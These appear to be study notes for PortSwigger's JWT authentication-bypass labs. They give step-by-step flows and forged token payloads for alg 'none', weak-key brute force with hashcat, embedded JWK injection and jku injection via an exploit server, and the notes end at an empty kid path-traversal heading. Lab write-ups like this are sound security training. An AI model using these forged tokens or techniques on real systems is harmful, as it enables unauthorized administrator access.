
### JWT authentication bypass via unverified signature

### JWT authentication bypass via flawed signature verification
**Flow** :
`log in as wiener -> go to /admin path -> intercept the request -> edit JWT alg to 'none' -> delete the signature`
**Payload** : 
```base64
eyJraWQiOiI0YmQ4OTExZS01M2I4LTQwNDYtOTVlOS0wNzRkNGUxZGI4NzQiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczOTI5NTgwMCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```
```JSON
{  
    "kid": "4bd8911e-53b8-4046-95e9-074d4e1db874",  
    "alg": "none"  
}
{  
    "iss": "portswigger",  
    "exp": 1739295800,  
    "sub": "administrator"  
}
```
keep reminder, to put dot on the last 'claims'

### JWT authentication bypass via weak signing key
**Flow** :
`Login as wiener -> go to /admin path -> intercept the request -> bruteforce the jwt key with hashcat -> go to jwt editor to create new symmetric key, then paste the secret key -> edit the username from wiener to administrator -> click 'Sign' button -> send -> remove carlos user`

**Payload** :
hashcat command:
```bash
hashcat -a 0 -m 16500 <jwt_token> /path/to/wordlist
```

### JWT authentication bypass via jwk header injection
**Flow** :
`Login as wiener -> go to /admin path -> intercept the request -> go to JWT editor on burpsuite -> generate new RSA -> on JSON Web Token page on repeater click Attack with Embedded JWK -> click RSA generated -> edit the username from wiener to administrator -> send -> remove carlos user

**Payload** :
`eyJraWQiOiIwNzM4MTZmMi02N2YwLTRiNGQtYmRlMS04NjZiMjFjZWIwZGIiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjA3MzgxNmYyLTY3ZjAtNGI0ZC1iZGUxLTg2NmIyMWNlYjBkYiIsIm4iOiI2b3pTTjBqdjhoV01GalRCYkFZQ0hkaVV3UVB5Y2UzeTJucXBNTDBYSEdOTktxWGx2ZlR0dXA5X3MzYnhlLWw1dUtIUlRYWnQtWldHSFdsNU9rcnRub29hOFBtR2hkdEVpems3NXFJandPbzRobEN4UkMzOU1KWWQ5RW16WEMyaTFRZkxwRUNLekw1bGdwNzdvWXpjSHdsbC1kLWh6U2NReUQ1NF81cWFJejR5SlZMT21TZ1VENDB3SVZ5QkZTb1BveUppQnBESWtNUHcxMFRvQUZJLTVaSUxfWC04SmEweVFwZ3NjNlVON0MwSXBRNmdiWHBDNkJCR3MtWldUU1dPYmR3Q2FvbXl0Q25YSEhLTDNBeWdHcUN4RUV0TGpXRGNweVVSSTRYT1Q2aG9lbVZlV0ZLS2VPTWhuMlBCdmlxRXdXemQ1eGRwVzdJSndqM2xvc0JRRXcifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczOTUxNzQ4Niwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.VMjNFegYrjkxdJ604Hceoi_Q6zIY_f8ggyapDpi5i2fciLK_v0aXbD6kz8ZcoZYcTqAsXg1AHfWbi1ZvR7oQN2nbZqdKXpjsydXs3WqIIfFC1pSj4nIFGpMueIAlEBXuk62JIidFHuUweUZissQWQM-8CTtxzGO1b2vCv09LLeScCOP8j-GsMMJsq5whUzmJT8_X5tQL5RwKjM5CPv3hLejLS5bVzMOEF2DPVjwcDjuRiOAaxAW-2OhAYesgIN5BTpcfyJrkFAc7sZCDDWovHJoIEVNfwjqOB6XKoAO10SrXU2m7Xg3lNxPBTS7nersiVDxVLACHmvBit3VgOzbfXQ`
```JSON
{  
    "kid": "073816f2-67f0-4b4d-bde1-866b21ceb0db",  
    "typ": "JWT",  
    "alg": "RS256",  
    "jwk": {  
        "kty": "RSA",  
        "e": "AQAB",  
        "kid": "073816f2-67f0-4b4d-bde1-866b21ceb0db",  
        "n": "6ozSN0jv8hWMFjTBbAYCHdiUwQPyce3y2nqpML0XHGNNKqXlvfTtup9_s3bxe-l5uKHRTXZt-ZWGHWl5Okrtnooa8PmGhdtEizk75qIjwOo4hlCxRC39MJYd9EmzXC2i1QfLpECKzL5lgp77oYzcHwll-d-hzScQyD54_5qaIz4yJVLOmSgUD40wIVyBFSoPoyJiBpDIkMPw10ToAFI-5ZIL_X-8Ja0yQpgsc6UN7C0IpQ6gbXpC6BBGs-ZWTSWObdwCaomytCnXHHKL3AygGqCxEEtLjWDcpyURI4XOT6hoemVeWFKKeOMhn2PBviqEwWzd5xdpW7IJwj3losBQEw"  
    }  
}
{  
    "iss": "portswigger",  
    "exp": 1739517486,  
    "sub": "administrator"  
}
```

### JWT authentication bypass via jku header injection
**Flow** :
Generate New RSA Key on JWT Editor -> copy Public Key as JWK
exploit server:
```json
{
    "keys": [
{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "eae21d6b-c537-4844-903f-9f2df18ecdab",
    "n": "yKuYv0GpocXowigk5qnaxCWps3FZzunF1zCAhiOPs7s_EGx18Q3fxac1B3NY4pMiXooMD9TVBISsDVbvU3A0s4G2br_iP1raCqpdCTB7LxwlnTT8E3LAZswmisey-aJZScgELNIRBwCnV3SH0ywohp9-b7PjUUXCx3Cz0MpgB1ZG8Q02-MIdM-gIx5S97nMOKTCLbptGhX-8pzUBboIlPE_CwMleoa2q4RzRF5uE2lCNiaSSLcD_z9emI_RBACiQck6piB7zr0bhwmK1TErG7OFr1UuZ1KmeRcqIffgALr_nGaE4nk50iz142hL93Wvt7S-xBB2eGqm162Wvdb4_3Q"
}
    ]
}
```

on jwt header, change the value of kid to kid on exploit server -> add param "jku":"URL-To-Exploit-Server" -> on tab JSON Web Token Sign to resign the signature -> send

### JWT authentication bypass via kid header path traversal
**Flow** :
